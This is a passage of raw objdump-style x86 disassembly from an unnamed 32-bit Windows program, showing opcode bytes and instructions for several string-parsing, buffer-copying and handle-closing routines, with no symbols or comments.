  40ea93:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40ea96:	40                   	inc    %eax
  40ea97:	50                   	push   %eax
  40ea98:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  40ea9e:	50                   	push   %eax
  40ea9f:	ff 15 98 02 41 00    	call   *0x410298
  40eaa5:	50                   	push   %eax
  40eaa6:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40eaa9:	ff 15 64 02 41 00    	call   *0x410264
  40eaaf:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40eab5:	ff 15 54 02 41 00    	call   *0x410254
  40eabb:	53                   	push   %ebx
  40eabc:	6a 22                	push   $0x22
  40eabe:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40eac1:	ff 15 04 02 41 00    	call   *0x410204
  40eac7:	8b 0d 9c 02 41 00    	mov    0x41029c,%ecx
  40eacd:	3b 01                	cmp    (%ecx),%eax
  40eacf:	74 35                	je     0x40eb06
  40ead1:	8d 78 01             	lea    0x1(%eax),%edi
  40ead4:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40ead7:	57                   	push   %edi
  40ead8:	6a 22                	push   $0x22
  40eada:	ff 15 04 02 41 00    	call   *0x410204
  40eae0:	48                   	dec    %eax
  40eae1:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40eae4:	48                   	dec    %eax
  40eae5:	50                   	push   %eax
  40eae6:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40eaec:	57                   	push   %edi
  40eaed:	50                   	push   %eax
  40eaee:	ff 15 98 02 41 00    	call   *0x410298
  40eaf4:	50                   	push   %eax
  40eaf5:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40eaf8:	ff 15 64 02 41 00    	call   *0x410264
  40eafe:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  40eb04:	eb 3c                	jmp    0x40eb42
  40eb06:	33 ff                	xor    %edi,%edi
  40eb08:	53                   	push   %ebx
  40eb09:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40eb0c:	ff 15 ac 02 41 00    	call   *0x4102ac
  40eb12:	8a 00                	mov    (%eax),%al
  40eb14:	3c 20                	cmp    $0x20,%al
  40eb16:	75 08                	jne    0x40eb20
  40eb18:	47                   	inc    %edi
  40eb19:	3a c0                	cmp    %al,%al
  40eb1b:	75 03                	jne    0x40eb20
  40eb1d:	57                   	push   %edi
  40eb1e:	eb e9                	jmp    0x40eb09
  40eb20:	a1 9c 02 41 00       	mov    0x41029c,%eax
  40eb25:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40eb28:	ff 30                	push   (%eax)
  40eb2a:	8d 45 90             	lea    -0x70(%ebp),%eax
  40eb2d:	57                   	push   %edi
  40eb2e:	50                   	push   %eax
  40eb2f:	ff 15 98 02 41 00    	call   *0x410298
  40eb35:	50                   	push   %eax
  40eb36:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40eb39:	ff 15 64 02 41 00    	call   *0x410264
  40eb3f:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  40eb42:	ff 15 54 02 41 00    	call   *0x410254
  40eb48:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40eb4b:	68 1c 0c 41 00       	push   $0x410c1c
  40eb50:	50                   	push   %eax
  40eb51:	ff 15 38 02 41 00    	call   *0x410238
  40eb57:	59                   	pop    %ecx
  40eb58:	59                   	pop    %ecx
  40eb59:	84 c0                	test   %al,%al
  40eb5b:	8b ce                	mov    %esi,%ecx
  40eb5d:	74 61                	je     0x40ebc0
  40eb5f:	ff 15 a0 02 41 00    	call   *0x4102a0
  40eb65:	83 f8 03             	cmp    $0x3,%eax
  40eb68:	0f 86 8b 00 00 00    	jbe    0x40ebf9
  40eb6e:	a1 9c 02 41 00       	mov    0x41029c,%eax
  40eb73:	8b ce                	mov    %esi,%ecx
  40eb75:	ff 30                	push   (%eax)
  40eb77:	6a 5c                	push   $0x5c
  40eb79:	ff 15 00 02 41 00    	call   *0x410200
  40eb7f:	50                   	push   %eax
  40eb80:	8d 45 80             	lea    -0x80(%ebp),%eax
  40eb83:	53                   	push   %ebx
  40eb84:	50                   	push   %eax
  40eb85:	8b ce                	mov    %esi,%ecx
  40eb87:	ff 15 98 02 41 00    	call   *0x410298
  40eb8d:	50                   	push   %eax
  40eb8e:	8b ce                	mov    %esi,%ecx
  40eb90:	ff 15 64 02 41 00    	call   *0x410264
  40eb96:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  40eb99:	ff 15 54 02 41 00    	call   *0x410254
  40eb9f:	53                   	push   %ebx
  40eba0:	6a 5c                	push   $0x5c
  40eba2:	8b ce                	mov    %esi,%ecx
  40eba4:	ff 15 04 02 41 00    	call   *0x410204
  40ebaa:	8b 0d 9c 02 41 00    	mov    0x41029c,%ecx
  40ebb0:	3b 01                	cmp    (%ecx),%eax
  40ebb2:	75 45                	jne    0x40ebf9
  40ebb4:	6a 5c                	push   $0x5c
  40ebb6:	8b ce                	mov    %esi,%ecx
  40ebb8:	ff 15 f8 01 41 00    	call   *0x4101f8
  40ebbe:	eb 39                	jmp    0x40ebf9
  40ebc0:	ff 15 a0 02 41 00    	call   *0x4102a0
  40ebc6:	83 f8 03             	cmp    $0x3,%eax
  40ebc9:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40ebcc:	50                   	push   %eax
  40ebcd:	76 22                	jbe    0x40ebf1
  40ebcf:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40ebd2:	6a 5c                	push   $0x5c
  40ebd4:	50                   	push   %eax
  40ebd5:	e8 7c 10 00 00       	call   0x40fc56
  40ebda:	83 c4 0c             	add    $0xc,%esp
  40ebdd:	8b ce                	mov    %esi,%ecx
  40ebdf:	50                   	push   %eax
  40ebe0:	ff 15 94 02 41 00    	call   *0x410294
  40ebe6:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40ebe9:	ff 15 54 02 41 00    	call   *0x410254
  40ebef:	eb 08                	jmp    0x40ebf9
  40ebf1:	8b ce                	mov    %esi,%ecx
  40ebf3:	ff 15 94 02 41 00    	call   *0x410294
  40ebf9:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40ebfc:	0f 87 e9 fd ff ff    	ja     0x40e9eb
  40ec02:	38 5d fe             	cmp    %bl,-0x2(%ebp)
  40ec05:	74 0a                	je     0x40ec11
  40ec07:	53                   	push   %ebx
  40ec08:	ff 75 b0             	push   -0x50(%ebp)
  40ec0b:	ff 15 00 01 41 00    	call   *0x410100
  40ec11:	6a ff                	push   $0xffffffff
  40ec13:	ff 75 b0             	push   -0x50(%ebp)
  40ec16:	ff 15 80 01 41 00    	call   *0x410180
  40ec1c:	ff 75 b4             	push   -0x4c(%ebp)
  40ec1f:	8b 35 58 01 41 00    	mov    0x410158,%esi
  40ec25:	ff d6                	call   *%esi
  40ec27:	ff 75 b0             	push   -0x50(%ebp)
  40ec2a:	ff d6                	call   *%esi
  40ec2c:	eb 06                	jmp    0x40ec34
  40ec2e:	8b 35 58 01 41 00    	mov    0x410158,%esi
  40ec34:	ff 75 f4             	push   -0xc(%ebp)
  40ec37:	ff d6                	call   *%esi
  40ec39:	ff 75 e0             	push   -0x20(%ebp)
  40ec3c:	ff d6                	call   *%esi
  40ec3e:	80 7d fe 01          	cmpb   $0x1,-0x2(%ebp)
  40ec42:	5f                   	pop    %edi
  40ec43:	5e                   	pop    %esi
  40ec44:	5b                   	pop    %ebx
  40ec45:	75 0f                	jne    0x40ec56
  40ec47:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ec4a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40ec4d:	50                   	push   %eax
  40ec4e:	ff 15 60 02 41 00    	call   *0x410260
  40ec54:	eb 5c                	jmp    0x40ecb2
  40ec56:	6a 3e                	push   $0x3e
  40ec58:	68 80 5b 41 00       	push   $0x415b80
  40ec5d:	6a 0a                	push   $0xa
  40ec5f:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40ec62:	6a 0d                	push   $0xd
  40ec64:	50                   	push   %eax
  40ec65:	8d 45 90             	lea    -0x70(%ebp),%eax
  40ec68:	50                   	push   %eax
  40ec69:	e8 b8 0f 00 00       	call   0x40fc26
  40ec6e:	83 c4 0c             	add    $0xc,%esp
  40ec71:	50                   	push   %eax
  40ec72:	8d 45 80             	lea    -0x80(%ebp),%eax
  40ec75:	50                   	push   %eax
  40ec76:	e8 ab 0f 00 00       	call   0x40fc26
  40ec7b:	83 c4 0c             	add    $0xc,%esp
  40ec7e:	50                   	push   %eax
  40ec7f:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40ec82:	50                   	push   %eax
  40ec83:	e8 8c 0f 00 00       	call   0x40fc14
  40ec88:	83 c4 0c             	add    $0xc,%esp
  40ec8b:	50                   	push   %eax
  40ec8c:	ff 75 08             	push   0x8(%ebp)
  40ec8f:	e8 92 0f 00 00       	call   0x40fc26
  40ec94:	83 c4 0c             	add    $0xc,%esp
  40ec97:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40ec9a:	ff 15 54 02 41 00    	call   *0x410254
  40eca0:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  40eca3:	ff 15 54 02 41 00    	call   *0x410254
  40eca9:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  40ecac:	ff 15 54 02 41 00    	call   *0x410254
  40ecb2:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40ecb5:	ff 15 54 02 41 00    	call   *0x410254
  40ecbb:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40ecbe:	ff 15 54 02 41 00    	call   *0x410254
  40ecc4:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40ecc7:	ff 15 54 02 41 00    	call   *0x410254
  40eccd:	8b 45 08             	mov    0x8(%ebp),%eax
  40ecd0:	c9                   	leave
  40ecd1:	c3                   	ret
  40ecd2:	b9 80 5b 41 00       	mov    $0x415b80,%ecx
  40ecd7:	ff 25 54 02 41 00    	jmp    *0x410254
  40ecdd:	55                   	push   %ebp
  40ecde:	8b ec                	mov    %esp,%ebp
  40ece0:	53                   	push   %ebx
  40ece1:	56                   	push   %esi
  40ece2:	ff 75 08             	push   0x8(%ebp)
  40ece5:	6a 00                	push   $0x0
  40ece7:	6a 01                	push   $0x1
  40ece9:	ff 15 14 01 41 00    	call   *0x410114
  40ecef:	8b f0                	mov    %eax,%esi
  40ecf1:	6a 00                	push   $0x0
  40ecf3:	56                   	push   %esi
  40ecf4:	ff 15 00 01 41 00    	call   *0x410100
  40ecfa:	85 c0                	test   %eax,%eax
  40ecfc:	56                   	push   %esi
  40ecfd:	0f 95 c3             	setne  %bl
  40ed00:	ff 15 58 01 41 00    	call   *0x410158
  40ed06:	8a c3                	mov    %bl,%al
  40ed08:	5e                   	pop    %esi
  40ed09:	5b                   	pop    %ebx
  40ed0a:	5d                   	pop    %ebp
  40ed0b:	c3                   	ret
  40ed0c:	55                   	push   %ebp
  40ed0d:	8b ec                	mov    %esp,%ebp
  40ed0f:	56                   	push   %esi
  40ed10:	8b 35 d8 00 41 00    	mov    0x4100d8,%esi
  40ed16:	6a 02                	push   $0x2
  40ed18:	6a 01                	push   $0x1
  40ed1a:	6a 00                	push   $0x0
  40ed1c:	ff 75 08             	push   0x8(%ebp)
  40ed1f:	ff d6                	call   *%esi
  40ed21:	50                   	push   %eax
  40ed22:	ff 15 1c 01 41 00    	call   *0x41011c
  40ed28:	50                   	push   %eax
  40ed29:	ff d6                	call   *%esi
  40ed2b:	50                   	push   %eax
  40ed2c:	ff 15 18 01 41 00    	call   *0x410118
  40ed32:	5e                   	pop    %esi
  40ed33:	5d                   	pop    %ebp
  40ed34:	c3                   	ret
  40ed35:	55                   	push   %ebp
  40ed36:	8b ec                	mov    %esp,%ebp
  40ed38:	83 ec 24             	sub    $0x24,%esp
  40ed3b:	80 65 dc 00          	andb   $0x0,-0x24(%ebp)
  40ed3f:	57                   	push   %edi
  40ed40:	6a 08                	push   $0x8
  40ed42:	33 c0                	xor    %eax,%eax
  40ed44:	59                   	pop    %ecx
  40ed45:	8d 7d dd             	lea    -0x23(%ebp),%edi
  40ed48:	f3 ab                	rep stos %eax,%es:(%edi)
  40ed4a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40ed4d:	6a 0a                	push   $0xa
  40ed4f:	50                   	push   %eax
  40ed50:	ff 75 0c             	push   0xc(%ebp)
  40ed53:	ff 15 5c 03 41 00    	call   *0x41035c
  40ed59:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ed5c:	83 c4 0c             	add    $0xc,%esp
  40ed5f:	8d 45 0f             	lea    0xf(%ebp),%eax
  40ed62:	50                   	push   %eax
  40ed63:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40ed66:	50                   	push   %eax
  40ed67:	ff 15 4c 02 41 00    	call   *0x41024c
  40ed6d:	8b 45 08             	mov    0x8(%ebp),%eax
  40ed70:	5f                   	pop    %edi
  40ed71:	c9                   	leave
  40ed72:	c3                   	ret
  40ed73:	55                   	push   %ebp
  40ed74:	8b ec                	mov    %esp,%ebp
  40ed76:	83 ec 14             	sub    $0x14,%esp
  40ed79:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40ed7c:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40ed7f:	50                   	push   %eax
  40ed80:	6a 20                	push   $0x20
  40ed82:	ff 15 10 02 41 00    	call   *0x410210
  40ed88:	50                   	push   %eax
  40ed89:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40ed8c:	ff 15 24 02 41 00    	call   *0x410224
  40ed92:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40ed95:	ff 15 a0 01 41 00    	call   *0x4101a0
  40ed9b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40ed9e:	50                   	push   %eax
  40ed9f:	ff 15 0c 02 41 00    	call   *0x41020c
  40eda5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40eda8:	50                   	push   %eax
  40eda9:	ff 15 08 02 41 00    	call   *0x410208
  40edaf:	50                   	push   %eax
  40edb0:	e8 2b 0a 00 00       	call   0x40f7e0
  40edb5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40edb8:	83 c4 0c             	add    $0xc,%esp
  40edbb:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40edbe:	50                   	push   %eax
  40edbf:	ff 15 60 02 41 00    	call   *0x410260
  40edc5:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40edc8:	ff 15 54 02 41 00    	call   *0x410254
  40edce:	8b 45 08             	mov    0x8(%ebp),%eax
  40edd1:	c9                   	leave
  40edd2:	c3                   	ret
  40edd3:	55                   	push   %ebp
  40edd4:	8b ec                	mov    %esp,%ebp
  40edd6:	83 ec 14             	sub    $0x14,%esp
  40edd9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40eddc:	53                   	push   %ebx
  40eddd:	56                   	push   %esi
  40edde:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40ede1:	57                   	push   %edi
  40ede2:	50                   	push   %eax
  40ede3:	ff 15 10 02 41 00    	call   *0x410210
  40ede9:	d1 e0                	shl    $1,%eax
  40edeb:	50                   	push   %eax
  40edec:	68 a0 18 41 00       	push   $0x4118a0
  40edf1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40edf4:	ff 15 70 02 41 00    	call   *0x410270
  40edfa:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40edfd:	ff 15 10 02 41 00    	call   *0x410210
  40ee03:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40ee06:	8b d8                	mov    %eax,%ebx
  40ee08:	d1 e3                	shl    $1,%ebx
  40ee0a:	ff 15 c4 02 41 00    	call   *0x4102c4
  40ee10:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40ee13:	8b f0                	mov    %eax,%esi
  40ee15:	ff 15 58 02 41 00    	call   *0x410258
  40ee1b:	8b cb                	mov    %ebx,%ecx
  40ee1d:	8b f8                	mov    %eax,%edi
  40ee1f:	8b c1                	mov    %ecx,%eax
  40ee21:	c1 e9 02             	shr    $0x2,%ecx
  40ee24:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40ee26:	8b c8                	mov    %eax,%ecx
  40ee28:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40ee2b:	83 e1 03             	and    $0x3,%ecx
  40ee2e:	50                   	push   %eax
  40ee2f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40ee31:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ee34:	ff 15 60 02 41 00    	call   *0x410260
  40ee3a:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40ee3d:	ff 15 54 02 41 00    	call   *0x410254
  40ee43:	8b 45 08             	mov    0x8(%ebp),%eax
  40ee46:	5f                   	pop    %edi
  40ee47:	5e                   	pop    %esi
  40ee48:	5b                   	pop    %ebx
  40ee49:	c9                   	leave
  40ee4a:	c3                   	ret
  40ee4b:	55                   	push   %ebp
  40ee4c:	8b ec                	mov    %esp,%ebp
  40ee4e:	83 ec 10             	sub    $0x10,%esp
  40ee51:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40ee54:	53                   	push   %ebx
  40ee55:	56                   	push   %esi
  40ee56:	57                   	push   %edi
  40ee57:	ff 15 a0 02 41 00    	call   *0x4102a0
  40ee5d:	8b f0                	mov    %eax,%esi
  40ee5f:	46                   	inc    %esi
  40ee60:	46                   	inc    %esi
  40ee61:	8d 04 36             	lea    (%esi,%esi,1),%eax
  40ee64:	50                   	push   %eax
  40ee65:	e8 62 0e 00 00       	call   0x40fccc
  40ee6a:	59                   	pop    %ecx
  40ee6b:	8b d8                	mov    %eax,%ebx
  40ee6d:	8b ce                	mov    %esi,%ecx
  40ee6f:	33 c0                	xor    %eax,%eax
  40ee71:	8b d1                	mov    %ecx,%edx
  40ee73:	8b fb                	mov    %ebx,%edi
  40ee75:	c1 e9 02             	shr    $0x2,%ecx
  40ee78:	f3 ab                	rep stos %eax,%es:(%edi)
  40ee7a:	8b ca                	mov    %edx,%ecx
  40ee7c:	83 e1 03             	and    $0x3,%ecx
  40ee7f:	f3 aa                	rep stos %al,%es:(%edi)
  40ee81:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40ee84:	8d 7e fe             	lea    -0x2(%esi),%edi
  40ee87:	ff 15 58 02 41 00    	call   *0x410258
  40ee8d:	8b f0                	mov    %eax,%esi
  40ee8f:	8b c7                	mov    %edi,%eax
  40ee91:	8b fb                	mov    %ebx,%edi
  40ee93:	8b c8                	mov    %eax,%ecx
  40ee95:	c1 e9 02             	shr    $0x2,%ecx
  40ee98:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40ee9a:	8b c8                	mov    %eax,%ecx
  40ee9c:	8d 45 0f             	lea    0xf(%ebp),%eax
  40ee9f:	83 e1 03             	and    $0x3,%ecx
  40eea2:	50                   	push   %eax
  40eea3:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40eea5:	53                   	push   %ebx
  40eea6:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40eea9:	ff 15 bc 02 41 00    	call   *0x4102bc
  40eeaf:	53                   	push   %ebx
  40eeb0:	e8 77 0d 00 00       	call   0x40fc2c
  40eeb5:	59                   	pop    %ecx
  40eeb6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40eeb9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40eebc:	50                   	push   %eax
  40eebd:	ff 15 b4 02 41 00    	call   *0x4102b4
  40eec3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40eec6:	ff 15 c0 02 41 00    	call   *0x4102c0
  40eecc:	8b 45 08             	mov    0x8(%ebp),%eax
  40eecf:	5f                   	pop    %edi
  40eed0:	5e                   	pop    %esi
  40eed1:	5b                   	pop    %ebx
  40eed2:	c9                   	leave
  40eed3:	c3                   	ret
  40eed4:	55                   	push   %ebp
  40eed5:	8b ec                	mov    %esp,%ebp
  40eed7:	83 ec 10             	sub    $0x10,%esp
  40eeda:	56                   	push   %esi
  40eedb:	6a 00                	push   $0x0
  40eedd:	ff 75 1c             	push   0x1c(%ebp)
  40eee0:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40eee3:	ff 15 20 02 41 00    	call   *0x410220
  40eee9:	8b f0                	mov    %eax,%esi
  40eeeb:	a1 9c 02 41 00       	mov    0x41029c,%eax
  40eef0:	3b 30                	cmp    (%eax),%esi
  40eef2:	74 3b                	je     0x40ef2f
  40eef4:	ff 75 20             	push   0x20(%ebp)
  40eef7:	8d 45 1f             	lea    0x1f(%ebp),%eax
  40eefa:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40eefd:	50                   	push   %eax
  40eefe:	ff 75 1c             	push   0x1c(%ebp)
  40ef01:	ff 15 4c 02 41 00    	call   *0x41024c
  40ef07:	8b c8                	mov    %eax,%ecx
  40ef09:	ff 15 a0 02 41 00    	call   *0x4102a0
  40ef0f:	50                   	push   %eax
  40ef10:	56                   	push   %esi
  40ef11:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40ef14:	ff 15 ac 01 41 00    	call   *0x4101ac
  40ef1a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ef1d:	50                   	push   %eax
  40ef1e:	ff 15 60 02 41 00    	call   *0x410260
  40ef24:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ef27:	ff 15 54 02 41 00    	call   *0x410254
  40ef2d:	eb 0d                	jmp    0x40ef3c
  40ef2f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ef32:	8d 45 0c             	lea    0xc(%ebp),%eax
  40ef35:	50                   	push   %eax
  40ef36:	ff 15 60 02 41 00    	call   *0x410260
  40ef3c:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40ef3f:	ff 15 54 02 41 00    	call   *0x410254
  40ef45:	8b 45 08             	mov    0x8(%ebp),%eax
  40ef48:	5e                   	pop    %esi
  40ef49:	c9                   	leave
  40ef4a:	c3                   	ret
  40ef4b:	55                   	push   %ebp
  40ef4c:	8b ec                	mov    %esp,%ebp
  40ef4e:	83 ec 10             	sub    $0x10,%esp
  40ef51:	56                   	push   %esi
  40ef52:	8b 75 0c             	mov    0xc(%ebp),%esi
  40ef55:	8d 45 0f             	lea    0xf(%ebp),%eax
  40ef58:	57                   	push   %edi
  40ef59:	50                   	push   %eax
  40ef5a:	56                   	push   %esi
  40ef5b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ef5e:	33 ff                	xor    %edi,%edi
  40ef60:	ff 15 4c 02 41 00    	call   *0x41024c
  40ef66:	80 3e 00             	cmpb   $0x0,(%esi)
  40ef69:	74 2d                	je     0x40ef98
  40ef6b:	53                   	push   %ebx
  40ef6c:	89 75 0c             	mov    %esi,0xc(%ebp)
  40ef6f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ef72:	ff 15 a0 02 41 00    	call   *0x4102a0
  40ef78:	57                   	push   %edi
  40ef79:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ef7c:	8b d8                	mov    %eax,%ebx
  40ef7e:	ff 15 ac 02 41 00    	call   *0x4102ac
  40ef84:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40ef87:	47                   	inc    %edi
  40ef88:	ff 4d 0c             	decl   0xc(%ebp)
  40ef8b:	8a 4c 0b ff          	mov    -0x1(%ebx,%ecx,1),%cl
  40ef8f:	88 08                	mov    %cl,(%eax)
  40ef91:	80 3c 37 00          	cmpb   $0x0,(%edi,%esi,1)
  40ef95:	75 d8                	jne    0x40ef6f
  40ef97:	5b                   	pop    %ebx
  40ef98:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ef9b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ef9e:	50                   	push   %eax
  40ef9f:	ff 15 60 02 41 00    	call   *0x410260
  40efa5:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40efa8:	ff 15 54 02 41 00    	call   *0x410254
  40efae:	8b 45 08             	mov    0x8(%ebp),%eax
  40efb1:	5f                   	pop    %edi
  40efb2:	5e                   	pop    %esi
  40efb3:	c9                   	leave
  40efb4:	c3                   	ret
  40efb5:	55                   	push   %ebp
  40efb6:	8b ec                	mov    %esp,%ebp
  40efb8:	83 ec 34             	sub    $0x34,%esp
  40efbb:	56                   	push   %esi
  40efbc:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40efbf:	57                   	push   %edi
  40efc0:	50                   	push   %eax
  40efc1:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40efc4:	ff 15 50 02 41 00    	call   *0x410250
  40efca:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40efcd:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40efd0:	50                   	push   %eax
  40efd1:	e8 31 45 ff ff       	call   0x403507
  40efd6:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40efd9:	33 ff                	xor    %edi,%edi
  40efdb:	ff 15 a0 02 41 00    	call   *0x4102a0
  40efe1:	85 c0                	test   %eax,%eax
  40efe3:	0f 86 96 00 00 00    	jbe    0x40f07f
  40efe9:	8d 45 1c             	lea    0x1c(%ebp),%eax
  40efec:	57                   	push   %edi
  40efed:	50                   	push   %eax
  40efee:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40eff1:	ff 15 ec 01 41 00    	call   *0x4101ec
  40eff7:	8b f0                	mov    %eax,%esi
  40eff9:	a1 9c 02 41 00       	mov    0x41029c,%eax
  40effe:	3b 30                	cmp    (%eax),%esi
  40f000:	74 4e                	je     0x40f050
  40f002:	8b c6                	mov    %esi,%eax
  40f004:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40f007:	2b c7                	sub    %edi,%eax
  40f009:	50                   	push   %eax
  40f00a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40f00d:	57                   	push   %edi
  40f00e:	50                   	push   %eax
  40f00f:	ff 15 98 02 41 00    	call   *0x410298
  40f015:	50                   	push   %eax
  40f016:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f019:	ff 15 64 02 41 00    	call   *0x410264
  40f01f:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40f022:	ff 15 54 02 41 00    	call   *0x410254
  40f028:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40f02b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40f02e:	50                   	push   %eax
  40f02f:	e8 03 06 00 00       	call   0x40f637
  40f034:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  40f037:	ff 15 a0 02 41 00    	call   *0x4102a0
  40f03d:	03 c6                	add    %esi,%eax
  40f03f:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40f042:	8b f8                	mov    %eax,%edi
  40f044:	ff 15 a0 02 41 00    	call   *0x4102a0
  40f04a:	3b f8                	cmp    %eax,%edi
  40f04c:	72 9b                	jb     0x40efe9
  40f04e:	eb 2f                	jmp    0x40f07f
  40f050:	ff 30                	push   (%eax)
  40f052:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40f055:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40f058:	57                   	push   %edi
  40f059:	50                   	push   %eax
  40f05a:	ff 15 98 02 41 00    	call   *0x410298
  40f060:	50                   	push   %eax
  40f061:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f064:	ff 15 64 02 41 00    	call   *0x410264
  40f06a:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40f06d:	ff 15 54 02 41 00    	call   *0x410254
  40f073:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40f076:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40f079:	50                   	push   %eax
  40f07a:	e8 b8 05 00 00       	call   0x40f637
  40f07f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40f082:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40f085:	50                   	push   %eax
  40f086:	e8 64 05 00 00       	call   0x40f5ef
  40f08b:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40f08e:	e8 a9 2a ff ff       	call   0x401b3c
  40f093:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40f096:	ff 15 54 02 41 00    	call   *0x410254
  40f09c:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40f09f:	ff 15 54 02 41 00    	call   *0x410254
  40f0a5:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  40f0a8:	ff 15 54 02 41 00    	call   *0x410254
  40f0ae:	8b 45 08             	mov    0x8(%ebp),%eax
  40f0b1:	5f                   	pop    %edi
  40f0b2:	5e                   	pop    %esi
  40f0b3:	c9                   	leave
  40f0b4:	c3                   	ret
  40f0b5:	55                   	push   %ebp
  40f0b6:	8b ec                	mov    %esp,%ebp
  40f0b8:	51                   	push   %ecx
  40f0b9:	83 3d 94 5b 41 00 00 	cmpl   $0x0,0x415b94
  40f0c0:	74 19                	je     0x40f0db
  40f0c2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40f0c5:	50                   	push   %eax
  40f0c6:	ff 15 d8 00 41 00    	call   *0x4100d8
  40f0cc:	50                   	push   %eax
  40f0cd:	ff 15 94 5b 41 00    	call   *0x415b94
  40f0d3:	6a 01                	push   $0x1
  40f0d5:	58                   	pop    %eax
  40f0d6:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  40f0d9:	74 02                	je     0x40f0dd
  40f0db:	32 c0                	xor    %al,%al
  40f0dd:	c9                   	leave
  40f0de:	c3                   	ret
  40f0df:	55                   	push   %ebp
  40f0e0:	8b ec                	mov    %esp,%ebp
  40f0e2:	80 3d 90 5b 41 00 01 	cmpb   $0x1,0x415b90
  40f0e9:	75 25                	jne    0x40f110
